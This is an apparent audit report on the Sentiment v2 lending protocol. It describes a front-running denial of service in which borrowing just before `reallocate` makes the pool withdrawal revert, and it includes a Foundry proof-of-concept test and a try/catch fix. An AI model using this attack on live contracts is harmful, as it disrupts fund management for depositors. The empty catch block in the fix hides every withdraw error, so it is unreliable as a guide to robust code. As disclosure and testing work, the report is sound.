Expert Nylon Leopard

Medium

# Denial of Service (DoS) Vulnerability when withdrawing in Reallocation Function Due to Insufficient Liquidity Handling that can occur when a malicious user front runs reallocate

## Summary
The `reallocate` function in the protocol is vulnerable to a Denial of Service (DoS) attack due to inadequate handling of liquidity shortages in pools. Even if the allocator verifies that a withdrawal is possible, a malicious user can frontrun the transaction by borrowing enough assets to reduce the pool's liquidity, causing the reallocation function to fail. This results in the inability to withdraw funds, leading to the entire reallocation process reverting.

## Vulnerability Detail

The `borrow` function allows users to borrow assets from a pool, provided the pool has sufficient liquidity. However, this function does not account for the possibility of a frontrunning attack, where a user quickly borrows assets right before an allocator attempts to reallocate funds. If the borrow operation significantly reduces the pool's available liquidity, any subsequent attempt by the allocator to withdraw assets for reallocation will fail due to insufficient liquidity.

The `withdraw` function attempts to withdraw assets from a pool. However, if the pool lacks sufficient liquidity due to a prior borrow operation, the function will revert, causing the entire reallocation process to fail. This scenario is particularly problematic because it allows a single user to disrupt the entire reallocation mechanism, leading to a potential DoS attack.

```solidity
  /// @notice Mint borrow shares and send borrowed assets to the borrowing position
    /// @param position the position to mint shares to
    /// @param amt the amount of assets to borrow, denominated in notional asset units
    /// @return borrowShares the amount of shares minted
    function borrow(uint256 poolId, address position, uint256 amt) external returns (uint256 borrowShares) {
        PoolData storage pool = poolDataFor[poolId];

        if (pool.isPaused) revert Pool_PoolPaused(poolId);


        // update total pool debt, denominated in notional asset units and shares
@audit >> increase Borrowed Asset>>                              pool.totalBorrowAssets += amt;
                                                                                          pool.totalBorrowShares += borrowShares;
```

```solidity
 /// @notice Reallocate assets between underlying pools
    /// @param withdraws A list of poolIds, and the amount to withdraw from them
    /// @param deposits A list of poolIds, and the amount to deposit to them
    function reallocate(ReallocateParams[] calldata withdraws, ReallocateParams[] calldata deposits) external {
        if (!isAllocator[msg.sender] && msg.sender != Ownable.owner()) {
            revert SuperPool_OnlyAllocatorOrOwner(address(this), msg.sender);
        }

        uint256 withdrawsLength = withdraws.length;
        for (uint256 i; i < withdrawsLength; ++i) {
            if (poolCapFor[withdraws[i].poolId] == 0) revert SuperPool_PoolNotInQueue(withdraws[i].poolId);
      
@audit >>Improper error handling reversion possible (DOS)>>          POOL.withdraw(withdraws[i].poolId, withdraws[i].assets, address(this), address(this));

        }
```


```solidity
  /// @notice Withdraw assets from a pool
    /// @param poolId Pool id
    /// @param assets Amount of assets to be redeemed
    /// @param receiver Address that receives redeemed assets
    /// @param owner Address to redeem on behalf of
    /// @return shares Amount of shares redeemed from the pool
    function withdraw(
        uint256 poolId,
        uint256 assets,
        address receiver,
        address owner
    ) public returns (uint256 shares) {
        PoolData storage pool = poolDataFor[poolId];

        // update state to accrue interest since the last time accrue() was called
        accrue(pool, poolId);



        uint256 maxWithdrawAssets = pool.totalDepositAssets - pool.totalBorrowAssets;
        uint256 totalBalance = IERC20(pool.asset).balanceOf(address(this));
        maxWithdrawAssets = (totalBalance > maxWithdrawAssets) ? maxWithdrawAssets : totalBalance;


 @AUDIT>> Revert>>       if (maxWithdrawAssets < assets) revert Pool_InsufficientWithdrawLiquidity(poolId, maxWithdrawAssets, assets);

```

## Impact

The impact of this vulnerability is severe, as it can be exploited to disrupt the reallocation process, causing it to fail and revert. This not only affects the allocator's ability to manage funds efficiently but also poses a risk to the overall stability and functionality of the protocol.

To run this POC we need to import some contracts 
```solidity
import { Pool } from "src/Pool.sol";
import { PositionManager } from "src/PositionManager.sol";
import { Action, AssetData, DebtData } from "src/PositionManager.sol";
import { RiskEngine } from "src/RiskEngine.sol";
import { RiskModule } from "src/RiskModule.sol";
```
Add this to the state variables 

```solidity
  PositionManager positionManager;
    address position;
```
add to setup function

```solidity
  function setUp() public override {
        super.setUp();

   positionManager = protocol.positionManager();

  vm.startPrank(protocolOwner);
        riskEngine.setOracle(address(asset1), address(asset1Oracle)); // 1 asset1 = 1 eth
        riskEngine.setOracle(address(asset2), address(asset1Oracle)); // 1 asset2 = 1 eth
        riskEngine.setOracle(address(asset3), address(asset1Oracle)); // 1 asset3 = 1 eth
        vm.stopPrank();

        vm.startPrank(poolOwner);
        riskEngine.requestLtvUpdate(fixedRatePool, address(asset3), 0.9e18); // 2x lev
        riskEngine.acceptLtvUpdate(fixedRatePool, address(asset3));
        riskEngine.requestLtvUpdate(fixedRatePool, address(asset2), 0.9e18); // 2x lev
        riskEngine.acceptLtvUpdate(fixedRatePool, address(asset2));
        vm.stopPrank();
        asset1.mint(lender, 100e18);
        asset2.mint(user, 10e18);
        asset3.mint(user, 10e18);
    }

```

Now copy we can Copy this POC and run

```solidity
    function testAMoreComplexScenario() public {
        // 1. Initialize FixedRatePool and LinearRatePool each with a 50 ether cap
        // 2. User1, and User2 each deposit 50 ether into the superpool
        // 3. Lower the cap on FixedRatePool by 10 ether, raise it on LinearRatePool by the same
        // 4. ReAllocate
        // 5. Both users withdraw fully

        vm.startPrank(poolOwner);
        superPool.addPool(fixedRatePool, 50 ether);
        superPool.addPool(linearRatePool, 50 ether);
        vm.stopPrank();

        vm.startPrank(user);
        asset1.mint(user, 50 ether);
        asset1.approve(address(superPool), 50 ether);
        superPool.deposit(50 ether, user);
        vm.stopPrank();

        vm.startPrank(user2);
        asset1.mint(user2, 50 ether);
        asset1.approve(address(superPool), 50 ether);
        superPool.deposit(50 ether, user2);
        vm.stopPrank();

        vm.startPrank(poolOwner);
        superPool.modifyPoolCap(fixedRatePool, 40 ether);
        superPool.modifyPoolCap(linearRatePool, 60 ether);
        vm.stopPrank();

        SuperPool.ReallocateParams[] memory reAllocateDeposits = new SuperPool.ReallocateParams[](2);
        SuperPool.ReallocateParams[] memory reAllocateWithdrawals = new SuperPool.ReallocateParams[](2);


        superPool.accrue();

        reAllocateDeposits[0] = (SuperPool.ReallocateParams(fixedRatePool, 40 ether));
         reAllocateDeposits[1] = (SuperPool.ReallocateParams(linearRatePool, 50 ether));
        reAllocateWithdrawals[0] = (SuperPool.ReallocateParams(linearRatePool, 50 ether));
         reAllocateWithdrawals[1] = (SuperPool.ReallocateParams(fixedRatePool, 50 ether));

    
 


      vm.startPrank(user);
        asset2.approve(address(positionManager), 2e18);
        asset3.approve(address(positionManager), 1e18);

        // deposit 1e18 asset2, borrow 1e18 asset1
        Action[] memory actions = new Action[](6);
        (position, actions[0]) = newPosition(user, bytes32(uint256(0x123456789)));
        actions[1] = deposit(address(asset2), 2e18);
        actions[2] = deposit(address(asset3), 1e18);

        actions[3] = addToken(address(asset2));
        actions[4] = addToken(address(asset3));
        actions[5] = borrow(fixedRatePool, 1e18);
     
        positionManager.processBatch(position, actions);
        vm.stopPrank();






        vm.prank(poolOwner);

        superPool.reallocate(reAllocateWithdrawals, reAllocateDeposits);

   
    }
```
```solidity
Failing tests:
Encountered 1 failing test in test/core/Superpool.t.sol:SuperPoolUnitTests
[FAIL. Reason: Pool_InsufficientWithdrawLiquidity(57434361982780479954068976798695147770458926047813837143048764453559102174233 [5.743e76], 49000000000000000000 [4.9e19], 
50000000000000000000 [5e19])] testAMoreComplexScenario() (gas: 1542137)

```
By front running and borrowing 1 ether user successfully DOS reallocate.



## Code Snippet

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L439

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L569-L573

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L359-L362

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L457

## Tool used

Manual Review

## Recommendation

To mitigate this vulnerability, the following measures should be implemented:

1. **Graceful Handling of Insufficient Liquidity in the `withdraw` Function**:
   The `withdraw` function should be updated to handle insufficient liquidity more gracefully. Instead of causing the entire transaction to revert, the function could attempt to withdraw as much as possible from the pool and then continue with the remaining reallocation process. This approach minimizes the disruption caused by liquidity shortages.



```solidity
 /// @notice Reallocate assets between underlying pools
    /// @param withdraws A list of poolIds, and the amount to withdraw from them
    /// @param deposits A list of poolIds, and the amount to deposit to them
    function reallocate(ReallocateParams[] calldata withdraws, ReallocateParams[] calldata deposits) external {
        if (!isAllocator[msg.sender] && msg.sender != Ownable.owner()) {
            revert SuperPool_OnlyAllocatorOrOwner(address(this), msg.sender);
        }

        uint256 withdrawsLength = withdraws.length;
        for (uint256 i; i < withdrawsLength; ++i) {
            if (poolCapFor[withdraws[i].poolId] == 0) revert SuperPool_PoolNotInQueue(withdraws[i].poolId);
      
--        POOL.withdraw(withdraws[i].poolId, withdraws[i].assets, address(this), address(this));

++      {
++                try POOL.withdraw(withdraws[i].poolId, withdraws[i].assets, address(this), address(this)) {
++                  
 ++               } catch { }
++            }
```

